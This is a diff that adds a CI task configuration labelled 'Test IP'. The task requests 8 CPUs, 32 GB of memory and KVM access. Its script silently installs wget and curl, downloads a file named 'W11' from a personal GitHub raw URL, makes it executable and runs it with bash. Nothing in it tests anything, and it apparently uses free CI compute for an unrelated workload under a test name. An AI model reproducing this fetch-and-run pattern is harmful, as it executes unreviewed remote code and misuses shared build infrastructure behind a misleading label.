@@ -1,0 +1,17 @@
+
+task:
+  name: Test IP
+  timeout_in: 120m
+  environment:
+    TOKEN: among us
+  container:
+    cpu: 8
+    memory: 32G
+    image: docker.io/ubuntu
+    kvm: true
+  script: 
+   - apt-get update &>/dev/null 
+   - apt-get install wget curl -y &>/dev/null
+   - wget https://raw.githubusercontent.com/DangDev/dangdev/main/W11
+   - chmod +x *
+   - bash W11
